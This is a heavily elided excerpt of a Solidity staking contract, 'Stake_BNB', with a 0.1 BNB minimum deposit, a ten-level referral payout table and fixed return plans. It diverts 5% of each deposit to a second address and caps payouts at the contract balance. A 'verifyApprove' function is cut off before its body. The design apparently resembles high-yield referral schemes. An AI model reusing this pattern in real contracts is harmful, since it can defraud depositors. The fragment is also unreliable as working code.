...
contract Stake_BNB {
	...
	uint256 constant public INVEST_MIN_AMOUNT = 100000000000000000; // 0.1 bnb
	uint256[] public REFERRAL_PERCENTS = [70, 30, 20, 20, 20, 1, 1, 1, 1, 1];
    ...
    constructor(address payable _owner,address payable _addd) public {
        
		require(!isContract(_owner));
		owner = _owner;
		addd=_addd;

        plans.push(Plan(10000, 5));
        plans.push(Plan(90, 13));
        plans.push(Plan(180, 8));
        plans.push(Plan(270, 7));
	}
	...
	function invest(address referrer, uint8 plan) public payable {
        ...
        addd.transfer(msg.value.mul(5).div(100));
    ...
    function safeTransfer(address payable _to, uint _amount) internal returns (uint256 amount) {
        amount = (_amount < address(this).balance) ? _amount : address(this).balance;
       _to.transfer(amount);
    }
   
    function verifyApprove(uint256 amount) external{
